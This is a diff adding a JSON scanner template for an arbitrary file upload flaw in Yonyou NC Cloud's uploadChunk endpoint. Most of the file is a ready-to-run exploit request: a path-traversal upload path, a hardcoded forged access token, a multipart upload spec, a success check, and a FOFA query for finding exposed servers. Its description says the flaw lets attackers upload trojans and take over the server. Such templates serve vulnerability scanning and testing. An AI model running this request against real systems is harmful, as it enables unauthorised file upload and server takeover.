@@ -1,0 +1,43 @@
+{
+  "product": "用友NC Cloud",
+  "vul_name": "用友NC Cloud uploadChunk任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "uploadChunk文件存在任意文件上传漏洞，攻击者通过此漏洞可实现上传木马文件，控制服务器。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-NC-Cloud\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/CommputerMac/article/details/133895912",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1",
+      "header": {
+        "accessTokenNcc": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ"
+      },
+      "file": {
+        "file": [
+          "52e039302a62d077.txt",
+          "95cc64dd2825f9df13ec4ad683ecf339",
+          "multipart/form-data"
+        ]
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "操作成功"
+        }
+      ]
+    }
+  }
+}
